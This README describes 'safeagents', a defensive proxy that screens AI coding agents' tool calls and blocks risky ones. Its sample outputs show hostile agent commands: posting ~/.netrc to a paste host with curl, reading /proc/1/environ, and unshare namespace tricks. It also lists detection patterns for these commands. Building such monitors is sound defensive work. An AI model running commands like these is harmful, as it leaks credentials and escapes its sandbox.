[![safeagents demo](assets/safeagents.gif)](assets/safeagents.mp4)

A lightweight local proxy between your agent and its model server. It checks every tool call the model makes before the harness sees it, and swaps the calls it blocks for a text notice, so the harness runs nothing. It works with any harness that lets you set a base URL (Claude Code, Pi, Hermes, OpenCode, ...), over OpenAI Chat Completions or Anthropic Messages, streaming or not.

## Quickstart

On macOS, Linux or WSL:

```
curl -LsSf https://raw.githubusercontent.com/huggingface/safeagents/main/scripts/install.sh | sh
```

On Windows (PowerShell):

```
irm https://raw.githubusercontent.com/huggingface/safeagents/main/scripts/install.ps1 | iex
```

The script installs [uv](https://docs.astral.sh/uv/) if it's missing, installs safeagents as a uv tool and puts it on your `PATH`. Open a new terminal afterwards. To install a specific tag or commit, set `SAFEAGENTS_VERSION` first. Running the script again updates safeagents.

Start a proxy in the background, then point your agent at it:

```
$ safeagents start https://api.anthropic.com --log-only
1  http://127.0.0.1:8787 -> https://api.anthropic.com  (log: ~/.safeagents/run/1.log)

$ ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude
```

Manage the running proxies:

```
$ safeagents ls
1   pid 82837   http://127.0.0.1:8787 -> https://api.anthropic.com  started 2026-10-29 22:26:58  --log-only
$ safeagents stop 1
stopped 1  http://127.0.0.1:8787 -> https://api.anthropic.com
```

`--log-only` only reports what it would block, which is a good way to start. Drop it to block for real. Setup guides for 12 coding agents are in [docs/](docs/README.md).

## Commands

| command | what it does |
| --- | --- |
| `safeagents start URL [PORT] [options]` | runs a proxy in the background and prints its ID |
| `safeagents ls` | lists the running proxies |
| `safeagents stop ID` | stops one |
| `safeagents URL [PORT] [options]` | runs a proxy in this terminal, with a live view of the calls |
| `safeagents inspect [N]` | lists the calls that were blocked or flagged, or shows call N in full |

`URL` is the model server your agent normally talks to. `PORT` is where the proxy listens (default `8787`, on `127.0.0.1`), or a full address such as `0.0.0.0:8080`.

| option | meaning |
| --- | --- |
| `--log-only` | report flagged calls without changing responses |
| `--allow-host HOST` | extra host calls may reach, subdomains included (repeatable) |
| `--no-scan` | request-only checks, no atif-scan |
| `--block-severity` | `low`, `medium`, `high` or `critical`: findings at or above it block without asking the judge |
| `--judge-url`, `--judge-model` | the decision model; its API key comes from `SAFEAGENTS_JUDGE_API_KEY` |
| `--judge-fail-closed` | block suspicious calls when the judge errors or gives no verdict (default: allow and log) |
| `--journal PATH` | where flagged calls are kept (default `~/.safeagents/calls.jsonl`) |
| `--no-journal` | keep no record of them |

The built-in host allowlist covers loopback, GitHub, PyPI, Hugging Face, npm and crates.io.

## How it works

Each tool call goes through three stages:

1. **Request-only checks.** A call is blocked if it uses a tool the request never declared, or if its arguments contain a host (URL or bare IP) that appears nowhere in the conversation. The model's own earlier turns don't count.
2. **[atif-scan](https://github.com/huggingface/atif-scan) checks.** The conversation becomes an ATIF trace, so atif-scan's detectors run on the pending call: reading `/proc/1/environ`, `curl --noproxy`, a Kubernetes service-account token, `unshare`/`nsenter`, ... Findings at or above `--block-severity` (default `high`) are blocked, milder ones make the call suspicious.
3. **Decision model** (optional). Suspicious calls go to a judge model, which answers `allow` or `block`. Without a judge, they are only logged.

The judge only sees what the user wrote, the tool call and the findings, never the agent's reasoning or tool results, since an agent that wants a call to run would argue its case there. It can add blocks but never lift one, and clean calls never reach it.

Streaming adds no latency: each tool call is held until its arguments are complete (harnesses only run complete calls), then released byte for byte or replaced. Text is forwarded as it arrives. atif-scan costs about 10 to 20 ms per call on an M-series Mac.

## Watching the calls

Run in the foreground (`safeagents URL`) and the terminal shows a live histogram of verdicts and the latest calls:

```
╔═  SAFEAGENTS  ═══════════════════════════════════════════════════════════════════════╗
║ REQUESTS 000015   CALLS 000015                                                       ║
║                                                                                      ║
║ PASS       8  53% ███████████████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ║
║ WARN       3  20% █████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ║
║ FLAG       0   0% ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ║
║ BLOCK      4  27% ██████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ║
╚══════════════════════════════════════  127.0.0.1:8787 -> https://api.anthropic.com  ═╝
╔═  CALLS  ════════════════════════════════════════════════════════════════════════════╗
║ 17:53:21  WARN   Bash        unshare -Urm sh -c 'mount -t tm…  safeagents.namespace… ║
║ 17:53:21  BLOCK  Bash        curl --noproxy '*' -d @~/.netrc…  host `paste.example.… ║
║ 17:53:21  BLOCK  shell_exec  id && uname -a                    undeclared tool       ║
║ 17:53:21  PASS   WebFetch    https://docs.example.org/parser…                        ║
║ 17:53:21  PASS   Bash        ruff check src && pytest -q                             ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
```

`WARN` calls ran but raised a finding; `FLAG` ones would have been blocked without `--log-only`. A background proxy writes the same calls to its log, one line each.

Blocked, flagged and suspicious calls are also kept in `~/.safeagents/calls.jsonl` (readable by you only, since arguments can hold secrets):

```
$ safeagents inspect 3
call #3, 2026-10-29 13:52:56
verdict   suspicious
tool      Bash
model     fake-model
task      The parser tests in this repo fail. Fix them and keep ruff happy.
finding   side_channel.harness_secret_read (medium): Another process's environment read
arguments
{
  "command": "cat /proc/1/environ | tr '\\0' '\\n'"
}
```

## Development

From a clone of this repository:

```
uv sync
uv run pytest
```

To see it react without a real agent, `scripts/simulate.py` runs fake sessions that mix ordinary calls with the misuse from the Cohere report (nothing is executed):

```
uv run safeagents http://127.0.0.1:18081   # terminal 1
uv run python scripts/simulate.py          # terminal 2, see --agents and --delay
```

## License

Apache 2.0, see [LICENSE](LICENSE).
